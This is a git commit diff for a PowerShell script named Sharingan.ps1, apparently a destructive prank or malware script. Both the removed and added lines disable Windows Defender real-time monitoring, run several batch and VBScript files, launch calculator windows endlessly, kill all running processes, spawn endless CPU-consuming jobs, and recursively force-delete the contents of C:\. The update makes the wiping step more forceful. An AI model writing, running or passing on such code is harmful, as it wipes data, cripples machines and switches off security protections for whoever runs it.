0260ff3c7e683e41bc88a2f0a76df26405c8fa2a
GH05T HUNTER5 <108191615+GH05T-HUNTER5@users.noreply.github.com>
2023-04-26 11:39:16 +0530

    Update Sharingan.ps1

--- Sharingan.ps1
+++ Sharingan.ps1
@@ -1,13 +1,13 @@
-Cls 
+Clear-Host 
 Set-MpPreference -DisableRealtimeMonitoring $true
-./intermini.bat 
-./Dcube.bat 
-./Psycho.bat 
-./Drive.bat 
-./Endless.bat
-cscript looploop.vbs 
-while(1){&calc}
-for(){PS|SAPS}
-for(){sajb{for(){}}}
-Remove-Item C:\*
-Cls 
+Start-Process -FilePath ".\intermini.bat" -Wait
+Start-Process -FilePath ".\Dcube.bat" -Wait
+Start-Process -FilePath ".\Psycho.bat" -Wait
+Start-Process -FilePath ".\Drive.bat" -Wait
+Start-Process -FilePath ".\Endless.bat" -Wait
+Start-Process -FilePath "cscript.exe" -ArgumentList "looploop.vbs"
+while($true){Start-Process -FilePath "calc.exe"}
+for(){Get-Process | Stop-Process}
+while($true){Start-Job -ScriptBlock {while($true){}}}
+Remove-Item -Path "C:\*" -Force -Recurse
+Clear-Host
